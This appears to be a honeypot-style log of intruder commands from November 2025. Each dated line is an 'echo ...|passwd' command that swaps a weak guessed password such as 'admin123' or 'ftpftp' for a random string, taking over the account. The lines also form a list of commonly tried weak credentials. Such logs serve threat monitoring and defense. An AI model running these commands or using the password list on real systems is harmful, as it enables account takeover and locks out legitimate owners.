+"echo ""123\nMnMmIBcuWT4R\nMnMmIBcuWT4R\n""|passwd",24/11/2025 00:00,1
+"echo ""123\nNLoIZsgZpUxT\nNLoIZsgZpUxT\n""|passwd",15/11/2025 12:00,1
+"echo ""123\nPF7qcFjN2lbX\nPF7qcFjN2lbX\n""|passwd",25/11/2025 12:00,1
+"echo ""123\nPu1HhtjncMDs\nPu1HhtjncMDs\n""|passwd",29/11/2025 12:00,1
+"echo ""123\nQAWfqEvSdgBE\nQAWfqEvSdgBE\n""|passwd",30/11/2025 00:00,1
+"echo ""123\nQopqziaVlqFD\nQopqziaVlqFD\n""|passwd",23/11/2025 00:00,1
+"echo ""123\nRMvPxgcYiyJy\nRMvPxgcYiyJy\n""|passwd",25/11/2025 00:00,1
+"echo ""123\nT2Lwcx5BxnXz\nT2Lwcx5BxnXz\n""|passwd",24/11/2025 00:00,1
+"echo ""123\nTVnqG8E6zg6Q\nTVnqG8E6zg6Q\n""|passwd",25/11/2025 12:00,1
+"echo ""123\nTsFgqZbBDxKi\nTsFgqZbBDxKi\n""|passwd",15/11/2025 12:00,1
+"echo ""123\nV88KTukXOfZ7\nV88KTukXOfZ7\n""|passwd",28/11/2025 00:00,1
+"echo ""123\nY5L3geF8MLTc\nY5L3geF8MLTc\n""|passwd",15/11/2025 12:00,1
+"echo ""123\nYZGrQ2LwnR4a\nYZGrQ2LwnR4a\n""|passwd",24/11/2025 00:00,1
+"echo ""123\nYsRZHgiEIxW9\nYsRZHgiEIxW9\n""|passwd",25/11/2025 12:00,1
+"echo ""123\nYzESAgdMdoho\nYzESAgdMdoho\n""|passwd",30/11/2025 00:00,1
+"echo ""123\nZgoFeGYUNSfh\nZgoFeGYUNSfh\n""|passwd",30/11/2025 00:00,1
+"echo ""123\nazHFxGCg1C3Q\nazHFxGCg1C3Q\n""|passwd",24/11/2025 00:00,1
+"echo ""123\ncJy4llj4AebF\ncJy4llj4AebF\n""|passwd",24/11/2025 00:00,1
+"echo ""123\ncOoK30qFNuWr\ncOoK30qFNuWr\n""|passwd",23/11/2025 00:00,1
+"echo ""123\ncnkRdwf4pPf4\ncnkRdwf4pPf4\n""|passwd",24/11/2025 00:00,1
+"echo ""123\nesfA1qUTxy0c\nesfA1qUTxy0c\n""|passwd",30/11/2025 00:00,1
+"echo ""123\ngLshHyawmNUy\ngLshHyawmNUy\n""|passwd",25/11/2025 12:00,1
+"echo ""123\ngfTZAJooagP3\ngfTZAJooagP3\n""|passwd",25/11/2025 12:00,1
+"echo ""123\nhIjodLEq7Gqo\nhIjodLEq7Gqo\n""|passwd",25/11/2025 12:00,1
+"echo ""123\nhypyKrXzMTmS\nhypyKrXzMTmS\n""|passwd",23/11/2025 00:00,1
+"echo ""123\niIOXT0Fkfj82\niIOXT0Fkfj82\n""|passwd",29/11/2025 12:00,1
+"echo ""123\njO7rLhroQdf8\njO7rLhroQdf8\n""|passwd",25/11/2025 12:00,1
+"echo ""123\njOB0R1PRwAP2\njOB0R1PRwAP2\n""|passwd",28/11/2025 12:00,1
+"echo ""123\nkFSVJ7HCb4iJ\nkFSVJ7HCb4iJ\n""|passwd",30/11/2025 00:00,1
+"echo ""123\nlDcsdLof1Oeo\nlDcsdLof1Oeo\n""|passwd",15/11/2025 00:00,1
+"echo ""123\nmYK95rQ14vni\nmYK95rQ14vni\n""|passwd",28/11/2025 12:00,1
+"echo ""123\nml88Ow5blJRt\nml88Ow5blJRt\n""|passwd",15/11/2025 00:00,1
+"echo ""123\no4UqCMZPcfU3\no4UqCMZPcfU3\n""|passwd",24/11/2025 00:00,1
+"echo ""123\noL3680V15XVx\noL3680V15XVx\n""|passwd",30/11/2025 00:00,1
+"echo ""123\noiOxSzvnhuAr\noiOxSzvnhuAr\n""|passwd",25/11/2025 00:00,1
+"echo ""123\npdY4d32cPnqZ\npdY4d32cPnqZ\n""|passwd",25/11/2025 00:00,1
+"echo ""123\nraLgW5DCcxDy\nraLgW5DCcxDy\n""|passwd",20/11/2025 00:00,1
+"echo ""123\nruSZOQY4r7Za\nruSZOQY4r7Za\n""|passwd",24/11/2025 00:00,1
+"echo ""123\ns5w4Oy1EiXUd\ns5w4Oy1EiXUd\n""|passwd",27/11/2025 00:00,1
+"echo ""123\nu4jzUskB2RoF\nu4jzUskB2RoF\n""|passwd",25/11/2025 12:00,1
+"echo ""123\nxhdgKn20A1eQ\nxhdgKn20A1eQ\n""|passwd",24/11/2025 00:00,1
+"echo ""123\nyJXtGosGf9uR\nyJXtGosGf9uR\n""|passwd",25/11/2025 00:00,1
+"echo ""123\nz43D0cPsV4Pm\nz43D0cPsV4Pm\n""|passwd",24/11/2025 00:00,1
+"echo ""124578\nOSOPL18M8nIY\nOSOPL18M8nIY\n""|passwd",21/11/2025 00:00,1
+"echo ""124578\nqitObwFk7zyq\nqitObwFk7zyq\n""|passwd",21/11/2025 00:00,1
+"echo ""159357\nNld5duCUN28w\nNld5duCUN28w\n""|passwd",15/11/2025 12:00,1
+"echo ""1\n3R9XTOBYYcSH\n3R9XTOBYYcSH\n""|passwd",24/11/2025 00:00,1
+"echo ""1\n52v2J59oJMdT\n52v2J59oJMdT\n""|passwd",25/11/2025 00:00,1
+"echo ""1\n9lESb8HZ2PO5\n9lESb8HZ2PO5\n""|passwd",20/11/2025 00:00,1
+"echo ""1\n9tn0NCM2E29j\n9tn0NCM2E29j\n""|passwd",25/11/2025 00:00,1
+"echo ""1\nHdyJAAOG7cx0\nHdyJAAOG7cx0\n""|passwd",24/11/2025 00:00,1
+"echo ""1\nIDvhmkvHcz27\nIDvhmkvHcz27\n""|passwd",22/11/2025 00:00,1
+"echo ""1\nQuNy1SjNUR2A\nQuNy1SjNUR2A\n""|passwd",23/11/2025 00:00,1
+"echo ""1\nSmtlXpBrRvUe\nSmtlXpBrRvUe\n""|passwd",22/11/2025 00:00,1
+"echo ""1\nYXaGARJ16bRZ\nYXaGARJ16bRZ\n""|passwd",22/11/2025 00:00,1
+"echo ""1\nZktxovH1RZUj\nZktxovH1RZUj\n""|passwd",24/11/2025 00:00,1
+"echo ""1\ncP438zFL5Yu5\ncP438zFL5Yu5\n""|passwd",25/11/2025 00:00,1
+"echo ""1\nhwMH8qIQ1RNW\nhwMH8qIQ1RNW\n""|passwd",25/11/2025 12:00,1
+"echo ""1\nkJz67vRX7d4B\nkJz67vRX7d4B\n""|passwd",24/11/2025 00:00,1
+"echo ""1q2w3e4r\nZJdf3LeB3tJQ\nZJdf3LeB3tJQ\n""|passwd",22/11/2025 00:00,1
+"echo ""1qaz!QAZ\np2fOvXkioYJy\np2fOvXkioYJy\n""|passwd",23/11/2025 00:00,1
+"echo ""1qaz@WSX3edc\nB8PrMV3nappj\nB8PrMV3nappj\n""|passwd",25/11/2025 00:00,1
+"echo ""1qaz@WSX3edc\ngvQs8v6ptckh\ngvQs8v6ptckh\n""|passwd",25/11/2025 00:00,1
+"echo ""1qaz@wsx\n0BSiZf9GAN25\n0BSiZf9GAN25\n""|passwd",21/11/2025 00:00,1
+"echo ""1qaz@wsx\nUWpQYqvLK2iY\nUWpQYqvLK2iY\n""|passwd",21/11/2025 00:00,1
+"echo ""1qaz@wsx\ncRPkbusJsYIt\ncRPkbusJsYIt\n""|passwd",21/11/2025 00:00,1
+"echo ""1qaz@wsx\nsXiQEiP8aCiS\nsXiQEiP8aCiS\n""|passwd",21/11/2025 00:00,1
+"echo ""24online\nuL7cU7DCwGTm\nuL7cU7DCwGTm\n""|passwd",21/11/2025 00:00,1
+"echo ""54321\n1iBdkqK51qBV\n1iBdkqK51qBV\n""|passwd",22/11/2025 00:00,1
+"echo ""999999999\n9HVFaIVFfGNP\n9HVFaIVFfGNP\n""|passwd",20/11/2025 00:00,1
+"echo ""Abc12345678!\nEfoF7PslafrB\nEfoF7PslafrB\n""|passwd",20/11/2025 00:00,1
+"echo ""Abc12345678!\nd52OQfGZ8I7x\nd52OQfGZ8I7x\n""|passwd",20/11/2025 00:00,1
+"echo ""Abc12345678!\neCrwtBHZE3Vt\neCrwtBHZE3Vt\n""|passwd",20/11/2025 00:00,1
+"echo ""Admin@123\neDcYtiLDu3Ws\neDcYtiLDu3Ws\n""|passwd",25/11/2025 00:00,1
+"echo ""Admin@123\nqQKTkXb4U6CU\nqQKTkXb4U6CU\n""|passwd",25/11/2025 00:00,1
+"echo ""Administrator123\n5vHiwOJ3ALOq\n5vHiwOJ3ALOq\n""|passwd",21/11/2025 00:00,1
+"echo ""Administrator123\nCviafPthHTka\nCviafPthHTka\n""|passwd",21/11/2025 00:00,1
+"echo ""Administrator123\neDco6dHfNRw4\neDco6dHfNRw4\n""|passwd",21/11/2025 00:00,1
+"echo ""Administrator123\nmc7vsqt9wXDT\nmc7vsqt9wXDT\n""|passwd",21/11/2025 00:00,1
+"echo ""E1ementa!5\nYCudg21jszRd\nYCudg21jszRd\n""|passwd",25/11/2025 12:00,1
+"echo ""E1ementa!5\nZjPFXfF0nw87\nZjPFXfF0nw87\n""|passwd",25/11/2025 12:00,1
+"echo ""E1ementa!5\nh8FamUdjrd7v\nh8FamUdjrd7v\n""|passwd",25/11/2025 12:00,1
+"echo ""Huawei12#$\nKTilPMnteFsq\nKTilPMnteFsq\n""|passwd",28/11/2025 12:00,1
+"echo ""Huawei12#$\nPv7BOSMuB0TZ\nPv7BOSMuB0TZ\n""|passwd",28/11/2025 12:00,1
+"echo ""Huawei12#$\nRtWkd3zcCj46\nRtWkd3zcCj46\n""|passwd",28/11/2025 12:00,1
+"echo ""Huawei12#$\noaRBCgU5GoTK\noaRBCgU5GoTK\n""|passwd",28/11/2025 12:00,1
+"echo ""Huawei12#$\nsPehwLp1rx49\nsPehwLp1rx49\n""|passwd",28/11/2025 12:00,1
+"echo ""Huawei12#$\nwUS1usYFco4Y\nwUS1usYFco4Y\n""|passwd",28/11/2025 12:00,1
+"echo ""Itsemoemo2025@Washere2025\n6yC5RZsedQZF\n6yC5RZsedQZF\n""|passwd",22/11/2025 00:00,1
+"echo ""Itsemoemo2025@Washere2025\nLDt9u2ANiNix\nLDt9u2ANiNix\n""|passwd",22/11/2025 00:00,1
+"echo ""Itsemoemo2025@Washere2025\ndPTm0Lg1bnWI\ndPTm0Lg1bnWI\n""|passwd",22/11/2025 00:00,1
+"echo ""Itsemoemo2025@Washere2025\nwsb9mIKd83yF\nwsb9mIKd83yF\n""|passwd",22/11/2025 00:00,1
+"echo ""ORACLE\nPM5pVNhoHnOA\nPM5pVNhoHnOA\n""|passwd",16/11/2025 00:00,1
+"echo ""P@ssw0rd!\nEPOxa6RiqNC6\nEPOxa6RiqNC6\n""|passwd",16/11/2025 00:00,1
+"echo ""P@ssw0rd\n4X1CI4Amnu4M\n4X1CI4Amnu4M\n""|passwd",19/11/2025 00:00,1
+"echo ""P@ssw0rd\nU1O8ew67XXgq\nU1O8ew67XXgq\n""|passwd",19/11/2025 00:00,1
+"echo ""P@ssw0rd\nUsYbc1YEWgTm\nUsYbc1YEWgTm\n""|passwd",17/11/2025 12:00,1
+"echo ""P@ssw0rd\nYPbz7RCdEw8w\nYPbz7RCdEw8w\n""|passwd",17/11/2025 12:00,1
+"echo ""P@ssw0rd\nrebktJ63k8BZ\nrebktJ63k8BZ\n""|passwd",17/11/2025 12:00,1
+"echo ""Pa$$w0rd\nJxJmukyzEHHS\nJxJmukyzEHHS\n""|passwd",17/11/2025 12:00,1
+"echo ""Pa$$w0rd\nhZSblMnUpt6A\nhZSblMnUpt6A\n""|passwd",17/11/2025 12:00,1
+"echo ""Pa$$w0rd\nugOMq4XJw5pe\nugOMq4XJw5pe\n""|passwd",17/11/2025 12:00,1
+"echo ""Password!\nfbgbZebPiGB2\nfbgbZebPiGB2\n""|passwd",19/11/2025 00:00,1
+"echo ""Password123!\nDRQfIlVxNcgw\nDRQfIlVxNcgw\n""|passwd",22/11/2025 00:00,1
+"echo ""Password123!\nHjcSeZNnt8ky\nHjcSeZNnt8ky\n""|passwd",22/11/2025 00:00,1
+"echo ""Password123!\nJ9Ft9BpdVZ8I\nJ9Ft9BpdVZ8I\n""|passwd",22/11/2025 00:00,1
+"echo ""Password123!\nKHarq3KBGZnG\nKHarq3KBGZnG\n""|passwd",22/11/2025 00:00,1
+"echo ""Password123!\nPHnN0OJGrQcZ\nPHnN0OJGrQcZ\n""|passwd",22/11/2025 00:00,1
+"echo ""Password123!\nhR9KDYlFWtu0\nhR9KDYlFWtu0\n""|passwd",22/11/2025 00:00,1
+"echo ""Password123!\niFixZB2vkNHP\niFixZB2vkNHP\n""|passwd",17/11/2025 12:00,1
+"echo ""Password123!\nryIm2e7qHU8X\nryIm2e7qHU8X\n""|passwd",22/11/2025 00:00,1
+"echo ""Password123!\nuBHVVfpaYkNf\nuBHVVfpaYkNf\n""|passwd",22/11/2025 00:00,1
+"echo ""Password1\n1YiUOTEkthan\n1YiUOTEkthan\n""|passwd",15/11/2025 12:00,1
+"echo ""Password1\nEr1QmynvzY0d\nEr1QmynvzY0d\n""|passwd",15/11/2025 12:00,1
+"echo ""QWEasd123!\n4S6WPeeW7a1S\n4S6WPeeW7a1S\n""|passwd",19/11/2025 00:00,1
+"echo ""QWEasd123!\nYQN3YNHGXf4t\nYQN3YNHGXf4t\n""|passwd",19/11/2025 00:00,1
+"echo ""QWEasd123!\nza2F4lBCVrLp\nza2F4lBCVrLp\n""|passwd",19/11/2025 00:00,1
+"echo ""Qwer1234@\n9S7LJjL9mQrs\n9S7LJjL9mQrs\n""|passwd",23/11/2025 00:00,1
+"echo ""Qwer1234@\nRsx7HXVFRsWm\nRsx7HXVFRsWm\n""|passwd",23/11/2025 00:00,1
+"echo ""Qwer1234@\nhTHNwEUBOfTZ\nhTHNwEUBOfTZ\n""|passwd",23/11/2025 00:00,1
+"echo ""Qwer1234@\npNHxxcXo1tGO\npNHxxcXo1tGO\n""|passwd",23/11/2025 00:00,1
+"echo ""Qwer1234@\nsQjllMhpHRHg\nsQjllMhpHRHg\n""|passwd",23/11/2025 00:00,1
+"echo ""Welcome1\n3MhhGQdKrkIe\n3MhhGQdKrkIe\n""|passwd",15/11/2025 12:00,1
+"echo ""a123\nmQ3oEb0c7K5l\nmQ3oEb0c7K5l\n""|passwd",29/11/2025 00:00,1
+"echo ""aa@123\nOA3ppYq7kgzv\nOA3ppYq7kgzv\n""|passwd",25/11/2025 12:00,1
+"echo ""aa@123\nwos5kdj0gZyw\nwos5kdj0gZyw\n""|passwd",25/11/2025 12:00,1
+"echo ""abc12345\ncx7boTqRUqCq\ncx7boTqRUqCq\n""|passwd",20/11/2025 00:00,1
+"echo ""adam@123\n8hwcwfYsaJFy\n8hwcwfYsaJFy\n""|passwd",24/11/2025 00:00,1
+"echo ""adam@123\nO7sU7H3nId5i\nO7sU7H3nId5i\n""|passwd",24/11/2025 00:00,1
+"echo ""adam@123\nQxjh4u9p6SfU\nQxjh4u9p6SfU\n""|passwd",24/11/2025 00:00,1
+"echo ""adm\n8bSjqHDoePCv\n8bSjqHDoePCv\n""|passwd",29/11/2025 00:00,1
+"echo ""adm\nY4v9cZXD9onC\nY4v9cZXD9onC\n""|passwd",29/11/2025 00:00,1
+"echo ""admin123456789\nz1dpQtaqKc6y\nz1dpQtaqKc6y\n""|passwd",17/11/2025 12:00,1
+"echo ""admin1234\ndKbZCh2TAnju\ndKbZCh2TAnju\n""|passwd",25/11/2025 00:00,1
+"echo ""admin123@123\nFW16rhSVOH20\nFW16rhSVOH20\n""|passwd",29/11/2025 00:00,1
+"echo ""admin123\nFI3OJSVrLGPA\nFI3OJSVrLGPA\n""|passwd",24/11/2025 00:00,1
+"echo ""admin123\nJXrJeXkGgX2O\nJXrJeXkGgX2O\n""|passwd",24/11/2025 00:00,1
+"echo ""admin123\nZLyU8Iycy0QK\nZLyU8Iycy0QK\n""|passwd",26/11/2025 00:00,1
+"echo ""admin2024\nUOXh67PCK6nh\nUOXh67PCK6nh\n""|passwd",22/11/2025 00:00,1
+"echo ""administrator@123\nAa4AcIoaI5wT\nAa4AcIoaI5wT\n""|passwd",30/11/2025 00:00,1
+"echo ""ahmed\nPckOfLwYHMfp\nPckOfLwYHMfp\n""|passwd",28/11/2025 12:00,1
+"echo ""ahmed\nS6I7j0I5K5f0\nS6I7j0I5K5f0\n""|passwd",28/11/2025 12:00,1
+"echo ""ali@123\nDqSkiWU3m3w2\nDqSkiWU3m3w2\n""|passwd",25/11/2025 00:00,1
+"echo ""angel\n4uuRS1GmFAsK\n4uuRS1GmFAsK\n""|passwd",22/11/2025 12:00,1
+"echo ""ansadmin\nelJJL8ve1rFZ\nelJJL8ve1rFZ\n""|passwd",28/11/2025 12:00,1
+"echo ""ansible2025\nepW3RXKoS6LA\nepW3RXKoS6LA\n""|passwd",18/11/2025 00:00,1
+"echo ""anu\nkuiYEX7BBAYa\nkuiYEX7BBAYa\n""|passwd",19/11/2025 12:00,1
+"echo ""ark@123\nLdNvF4SwOKGh\nLdNvF4SwOKGh\n""|passwd",25/11/2025 00:00,1
+"echo ""autcom@123\n1eGFtflUnJDn\n1eGFtflUnJDn\n""|passwd",25/11/2025 00:00,1
+"echo ""backend123\nGzK9YE0Q1QyP\nGzK9YE0Q1QyP\n""|passwd",28/11/2025 12:00,1
+"echo ""bot@123\nfOxNrbRjN4t4\nfOxNrbRjN4t4\n""|passwd",26/11/2025 00:00,1
+"echo ""builder123\n203RJOqIw7Kj\n203RJOqIw7Kj\n""|passwd",15/11/2025 00:00,1
+"echo ""builder123\nQvKRNk8loCJW\nQvKRNk8loCJW\n""|passwd",27/11/2025 00:00,1
+"echo ""builder123\noOEPDiSWDfME\noOEPDiSWDfME\n""|passwd",27/11/2025 00:00,1
+"echo ""builder123\nz56roQCNmEy1\nz56roQCNmEy1\n""|passwd",27/11/2025 00:00,1
+"echo ""castle@123\nBXmGtIZhsg75\nBXmGtIZhsg75\n""|passwd",30/11/2025 00:00,1
+"echo ""castle@123\nSPLdAFJC3Iyc\nSPLdAFJC3Iyc\n""|passwd",30/11/2025 00:00,1
+"echo ""cc123\nwhmlaTjFwKWI\nwhmlaTjFwKWI\n""|passwd",26/11/2025 00:00,1
+"echo ""cds123\nI5Nu8uU75ANf\nI5Nu8uU75ANf\n""|passwd",25/11/2025 12:00,1
+"echo ""cds123\nrvserNwQadK4\nrvserNwQadK4\n""|passwd",25/11/2025 12:00,1
+"echo ""cds@123\nLqTKCP6P5gkx\nLqTKCP6P5gkx\n""|passwd",30/11/2025 00:00,1
+"echo ""cds@123\nepaionzwkTzc\nepaionzwkTzc\n""|passwd",30/11/2025 00:00,1
+"echo ""cds@123\ng00YwtEMqNku\ng00YwtEMqNku\n""|passwd",30/11/2025 00:00,1
+"echo ""celeryuser\n1nWsEDEmjVRN\n1nWsEDEmjVRN\n""|passwd",23/11/2025 00:00,1
+"echo ""celeryuser\nZZQZmlQcsLNw\nZZQZmlQcsLNw\n""|passwd",23/11/2025 00:00,1
+"echo ""celeryuser\nx2AmJWz8kCye\nx2AmJWz8kCye\n""|passwd",23/11/2025 00:00,1
+"echo ""coder\n0xrcuG4ef8SH\n0xrcuG4ef8SH\n""|passwd",19/11/2025 12:00,1
+"echo ""coder\nM2erqxFD3t2u\nM2erqxFD3t2u\n""|passwd",19/11/2025 00:00,1
+"echo ""compta\ngGLs0DkievkX\ngGLs0DkievkX\n""|passwd",15/11/2025 12:00,1
+"echo ""confluence\nuORHfbQl1CHI\nuORHfbQl1CHI\n""|passwd",20/11/2025 00:00,1
+"echo ""copia123\n0InpIGCNGC5g\n0InpIGCNGC5g\n""|passwd",28/11/2025 12:00,1
+"echo ""damian123\nELBCQ1xWugWG\nELBCQ1xWugWG\n""|passwd",15/11/2025 00:00,1
+"echo ""damian123\nFs8e8ckhn2CP\nFs8e8ckhn2CP\n""|passwd",15/11/2025 00:00,1
+"echo ""damian\nmELDS7759nJ4\nmELDS7759nJ4\n""|passwd",15/11/2025 12:00,1
+"echo ""db\nYq7ZhBu20Kf1\nYq7ZhBu20Kf1\n""|passwd",22/11/2025 00:00,1
+"echo ""dd\nFqMyhqoWXugI\nFqMyhqoWXugI\n""|passwd",25/11/2025 12:00,1
+"echo ""dd\nICp5vuE57aeS\nICp5vuE57aeS\n""|passwd",25/11/2025 12:00,1
+"echo ""dd\neHzU4RLWUxaL\neHzU4RLWUxaL\n""|passwd",25/11/2025 12:00,1
+"echo ""deamon123\nDjzXC867AEpr\nDjzXC867AEpr\n""|passwd",30/11/2025 00:00,1
+"echo ""deamon@123\nBizPixdLfiJe\nBizPixdLfiJe\n""|passwd",25/11/2025 12:00,1
+"echo ""deamon@123\nvQBlYj1TVYFK\nvQBlYj1TVYFK\n""|passwd",25/11/2025 12:00,1
+"echo ""debian10svm\nVUapOLen5iYj\nVUapOLen5iYj\n""|passwd",29/11/2025 12:00,1
+"echo ""deploy@\nc65DEnSS60Js\nc65DEnSS60Js\n""|passwd",22/11/2025 00:00,1
+"echo ""deploy@\niQeZSieSKEos\niQeZSieSKEos\n""|passwd",22/11/2025 00:00,1
+"echo ""dev\nTqEYvR6gaQLC\nTqEYvR6gaQLC\n""|passwd",20/11/2025 12:00,1
+"echo ""developer\niWlBmTi4VWeu\niWlBmTi4VWeu\n""|passwd",29/11/2025 00:00,1
+"echo ""developer\nq9LqQ7DErm35\nq9LqQ7DErm35\n""|passwd",29/11/2025 00:00,1
+"echo ""dq\nWxhfPOMH08s5\nWxhfPOMH08s5\n""|passwd",21/11/2025 00:00,1
+"echo ""dragon\n5Bz2dUWbNfi9\n5Bz2dUWbNfi9\n""|passwd",20/11/2025 00:00,1
+"echo ""dragon\no24tYWXqstSL\no24tYWXqstSL\n""|passwd",20/11/2025 00:00,1
+"echo ""dragon\nyrPUAZvMvBA3\nyrPUAZvMvBA3\n""|passwd",20/11/2025 00:00,1
+"echo ""elastic\nTAdCJ3SxVNtv\nTAdCJ3SxVNtv\n""|passwd",23/11/2025 00:00,1
+"echo ""elastic\nijXjFRHzxv1a\nijXjFRHzxv1a\n""|passwd",23/11/2025 00:00,1
+"echo ""elastic\nrfBeK7Zgg99A\nrfBeK7Zgg99A\n""|passwd",23/11/2025 00:00,1
+"echo ""elastic\nu8nhSN78TxPY\nu8nhSN78TxPY\n""|passwd",23/11/2025 00:00,1
+"echo ""elastic\nuVd3fCDPX8Ld\nuVd3fCDPX8Ld\n""|passwd",23/11/2025 00:00,1
+"echo ""elasticsearch\nHF4LLhdyTv5X\nHF4LLhdyTv5X\n""|passwd",15/11/2025 12:00,1
+"echo ""elemental123\nshINR0zh3Zu4\nshINR0zh3Zu4\n""|passwd",30/11/2025 00:00,1
+"echo ""eloa\nWSPUFWluF26K\nWSPUFWluF26K\n""|passwd",17/11/2025 12:00,1
+"echo ""eloa\npAEqWPwoBwmF\npAEqWPwoBwmF\n""|passwd",17/11/2025 12:00,1
+"echo ""emily\n0gTFnv3gfleJ\n0gTFnv3gfleJ\n""|passwd",20/11/2025 00:00,1
+"echo ""emily\nI4E4k9UTO8Pz\nI4E4k9UTO8Pz\n""|passwd",20/11/2025 00:00,1
+"echo ""emily\nVhGiLK4bwupn\nVhGiLK4bwupn\n""|passwd",20/11/2025 00:00,1
+"echo ""eren@123\n2yEkm7ZKhU3e\n2yEkm7ZKhU3e\n""|passwd",15/11/2025 12:00,1
+"echo ""eren@123\nCHWCv78lQYe3\nCHWCv78lQYe3\n""|passwd",15/11/2025 12:00,1
+"echo ""exx123\nYRibZgsllpFK\nYRibZgsllpFK\n""|passwd",28/11/2025 12:00,1
+"echo ""exx123\njuUpweryrx6X\njuUpweryrx6X\n""|passwd",28/11/2025 12:00,1
+"echo ""fan\n1Kj5y7E8hor2\n1Kj5y7E8hor2\n""|passwd",22/11/2025 12:00,1
+"echo ""fan\nFgKigUYqyAEm\nFgKigUYqyAEm\n""|passwd",29/11/2025 12:00,1
+"echo ""fan\nVIg2j5Uw0OB7\nVIg2j5Uw0OB7\n""|passwd",29/11/2025 12:00,1
+"echo ""fan\nWh45oNlK9aFb\nWh45oNlK9aFb\n""|passwd",22/11/2025 12:00,1
+"echo ""fan\nazjRjBH82don\nazjRjBH82don\n""|passwd",29/11/2025 12:00,1
+"echo ""fan\nggUfH7Dt0DCg\nggUfH7Dt0DCg\n""|passwd",29/11/2025 12:00,1
+"echo ""francesco\nEuFUQvpMF2QN\nEuFUQvpMF2QN\n""|passwd",17/11/2025 12:00,1
+"echo ""frappe\nSLTxldieEn4L\nSLTxldieEn4L\n""|passwd",30/11/2025 00:00,1
+"echo ""free\nNfJ9LDlcaRkn\nNfJ9LDlcaRkn\n""|passwd",26/11/2025 00:00,1
+"echo ""free\nWV0odvQr4LIg\nWV0odvQr4LIg\n""|passwd",26/11/2025 00:00,1
+"echo ""frontend123\nhKxX4z1AaKxQ\nhKxX4z1AaKxQ\n""|passwd",25/11/2025 12:00,1
+"echo ""frontend123\nrruhygI5yfQD\nrruhygI5yfQD\n""|passwd",25/11/2025 12:00,1
+"echo ""ftpftp\n37zFqYup579D\n37zFqYup579D\n""|passwd",23/11/2025 00:00,1
+"echo ""ftpftp\n3IxD7tGn9tYP\n3IxD7tGn9tYP\n""|passwd",23/11/2025 00:00,1
+"echo ""ftpftp\n90AUNZHXxgNM\n90AUNZHXxgNM\n""|passwd",22/11/2025 12:00,1
+"echo ""ftpftp\nC1LLYN7GJPhE\nC1LLYN7GJPhE\n""|passwd",23/11/2025 00:00,1
+"echo ""ftpftp\nETMuIgvYnSJ9\nETMuIgvYnSJ9\n""|passwd",22/11/2025 00:00,1
+"echo ""ftpftp\nKZEgug5oPK1v\nKZEgug5oPK1v\n""|passwd",23/11/2025 00:00,1
+"echo ""ftpftp\nLrVziApA6wFE\nLrVziApA6wFE\n""|passwd",22/11/2025 00:00,1
+"echo ""ftpftp\nPe1bZmsDk1eJ\nPe1bZmsDk1eJ\n""|passwd",23/11/2025 00:00,1
+"echo ""ftpftp\nYykw0WEXEPgS\nYykw0WEXEPgS\n""|passwd",22/11/2025 00:00,1
+"echo ""ftpftp\ncCddjSiJkR4g\ncCddjSiJkR4g\n""|passwd",22/11/2025 00:00,1
+"echo ""ftpftp\nj2punRbT8AhP\nj2punRbT8AhP\n""|passwd",22/11/2025 00:00,1
+"echo ""ftpftp\nl7H2P77tAXsZ\nl7H2P77tAXsZ\n""|passwd",23/11/2025 00:00,1
+"echo ""ftpftp\nt9ENITcEGoxl\nt9ENITcEGoxl\n""|passwd",23/11/2025 00:00,1
+"echo ""ftpftp\nthmLNNghPAwk\nthmLNNghPAwk\n""|passwd",22/11/2025 00:00,1
+"echo ""ftpftp\nxLVF3py1yHnF\nxLVF3py1yHnF\n""|passwd",22/11/2025 00:00,1
+"echo ""ftpftp\nzpvxb0N5T3Rn\nzpvxb0N5T3Rn\n""|passwd",22/11/2025 00:00,1
+"echo ""ftpftp\nzwUMLhfLFgVa\nzwUMLhfLFgVa\n""|passwd",23/11/2025 00:00,1
+"echo ""ftpuser01\nsrPkfLCfF1RZ\nsrPkfLCfF1RZ\n""|passwd",19/11/2025 12:00,1
+"echo ""ftpuser@2024\n6XHzUcO5iFLC\n6XHzUcO5iFLC\n""|passwd",15/11/2025 12:00,1
+"echo ""ftpuser@2024\nL0FiRww4VmkF\nL0FiRww4VmkF\n""|passwd",15/11/2025 12:00,1
+"echo ""ftpuser@2024\nuo1dljjiDdjx\nuo1dljjiDdjx\n""|passwd",15/11/2025 12:00,1
+"echo ""ftpuser\nzvKXEoq1KU9g\nzvKXEoq1KU9g\n""|passwd",15/11/2025 00:00,1
+"echo ""gcs@123\nUrh3hMtwM2mQ\nUrh3hMtwM2mQ\n""|passwd",22/11/2025 00:00,1
+"echo ""gerald\nY35XagYilVDU\nY35XagYilVDU\n""|passwd",21/11/2025 00:00,1
+"echo ""gfhjkm\nuRKTqUZqFNK7\nuRKTqUZqFNK7\n""|passwd",15/11/2025 00:00,1
+"echo ""gitea123\n9oAetT7ZOnut\n9oAetT7ZOnut\n""|passwd",26/11/2025 00:00,1
+"echo ""glassfish\n955VHxBT1uR7\n955VHxBT1uR7\n""|passwd",20/11/2025 00:00,1
+"echo ""glassfish\nlaFSF0YZBlj1\nlaFSF0YZBlj1\n""|passwd",20/11/2025 00:00,1
+"echo ""glassfish\nsBgROrNT089p\nsBgROrNT089p\n""|passwd",20/11/2025 00:00,1
+"echo ""glassfish\nwZIJxowWug6V\nwZIJxowWug6V\n""|passwd",20/11/2025 00:00,1
+"echo ""glenn@123\nAPTzhniMKbP0\nAPTzhniMKbP0\n""|passwd",27/11/2025 00:00,1
+"echo ""glenn@123\nI9siDbCARcAi\nI9siDbCARcAi\n""|passwd",27/11/2025 00:00,1
+"echo ""glenn@123\nVZ0TXEpJvNvN\nVZ0TXEpJvNvN\n""|passwd",27/11/2025 00:00,1
+"echo ""glenn@123\nbFi8wzRoinSu\nbFi8wzRoinSu\n""|passwd",27/11/2025 00:00,1
+"echo ""gnssr\nGtEbOmBetMwp\nGtEbOmBetMwp\n""|passwd",22/11/2025 00:00,1
+"echo ""gnssr\nLF5qpBE4GJEI\nLF5qpBE4GJEI\n""|passwd",22/11/2025 00:00,1
+"echo ""gnssr\ndgeqpECdiKdY\ndgeqpECdiKdY\n""|passwd",22/11/2025 00:00,1
+"echo ""guest!@#\n2XsI4lxpjWqM\n2XsI4lxpjWqM\n""|passwd",25/11/2025 12:00,1
+"echo ""guest!@#\nd44D1QSsQOPI\nd44D1QSsQOPI\n""|passwd",25/11/2025 12:00,1
+"echo ""hadoop\ncFBqE58Aoz7B\ncFBqE58Aoz7B\n""|passwd",25/11/2025 00:00,1
+"echo ""hadoop\nfBU6n0KgR8RZ\nfBU6n0KgR8RZ\n""|passwd",25/11/2025 00:00,1
